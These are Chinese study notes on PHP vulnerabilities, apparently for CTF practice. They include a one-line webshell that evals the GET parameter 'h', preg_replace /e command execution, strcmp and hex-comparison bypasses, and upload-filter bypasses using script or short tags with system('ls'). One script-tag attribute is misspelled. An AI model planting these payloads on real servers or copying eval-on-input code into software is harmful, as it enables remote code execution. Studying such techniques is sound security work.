# php漏洞

## 函数利用

### preg_replace_callback

```php
<?php
preg_replace_callback("/.*/",function ($a){@eval($a[0]);},$_GET["h"]);
?>
```



利用条件:php版本=7

### preg_replace()

preg_replace漏洞触发有两个前提：

1. 第一个参数需要e标识符，有了它可以执行第二个参数的命令

2. 第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：

3. php版本<7

4. ```php
   echo preg_replace('/test/e', 'phpinfo()', 'just test');
   //这样是可以执行命令的
   
   echo preg_replace('/test/e', 'phpinfo()', 'just tesxt'); 
   echo preg_replace('/tesxt/e', 'phpinfo()', 'just test'); 
   //这两种没有匹配上，所以返回值是第三个参数，不能执行命令
   ```



## 函数绕过

### strcmp

- 利用条件：
适用于5.3之前版本的php
- 接收到非字符串类型的变量会报错，并返回0

## 文件包含漏洞

### php伪协议

### 配合文件上传的漏洞

- 文件上传后缀名绕过看web杂项

- 文件内容被更换

  - 如<?php ?>中的<?和?>被替换，可以用<script>标签绕过

  ```php+HTML
  <script langulage=php>
  system("ls");
  </script>
  ```

  -    <? echo 'this is the simplest, an SGML processing instruction'; ?>
        <?= expression ?> This is a shortcut for "<? echo expression ?>"

  ​        利用条件：php.ini 配置文件中的指令 [short_open_tag](https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag) 打开后才可用

  -  <% echo 'You may optionally use ASP-style tags'; %>
        <%= $variable; # This is a shortcut for "<% echo . . ." %>  

      利用条件：php.ini 配置文件中的指令 [asp_tags](https://www.php.net/manual/zh/ini.core.php#ini.asp-tags) 打开后才可用。

## 杂

### '0xaa'可以被理解为数字(php7之前的版本)
所以'0xccccccccc'='54975581388'

